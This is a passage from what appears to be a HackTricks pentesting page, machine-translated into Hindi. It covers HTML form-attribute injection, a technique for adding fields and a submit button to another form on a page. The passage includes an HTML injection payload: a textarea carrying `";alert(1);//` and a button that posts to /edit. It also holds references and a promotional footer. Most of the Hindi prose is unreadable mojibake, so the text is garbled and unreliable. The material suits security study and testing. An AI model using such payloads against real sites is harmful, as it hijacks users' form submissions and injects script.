рдХреБрдЫ рдЯреИрдЧреНрд╕ рдХреЗ рдЕрдВрджрд░ `form` рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдХреЗ рдЖрдк **рдлреЙрд░реНрдо рдХреЗ рдЕрдВрджрд░ рдирдП рдПрдВрдЯреНрд░реАрдЬрд╝ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдлреЙрд░реНрдо рдХреЗ рдЕрдВрджрд░ рдирдП рдорд╛рди рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЗрд╕реЗ **рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдирдпрд╛ рдмрдЯрди** рднреА рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ (рдХреНрд▓рд┐рдХрдЬреИрдХрд┐рдВрдЧ рдпрд╛ `.click()` JS рдХреЛрдб рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛):

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* [**рдЗрд╕реЗ рджреЗрдЦреЗрдВ**](https://www.w3schools.com/tags/tag\_button.asp)** рдореЗрдВ рдФрд░ рдлреЙрд░реНрдо рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред**

## рд╕рдВрджрд░реНрдн

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* Heyes, Gareth. JavaScript for hackers: Learn to think like a hacker.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT рд╕рдВрдЧреНрд░рд╣**](https://opensea.io/collection/the-peass-family) рджреЗрдЦреЗрдВ
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* **[**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВред**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рдЕрдкрдирд╛ рдпреЛрдЧрджрд╛рди рджреЗрдВред**

</details>
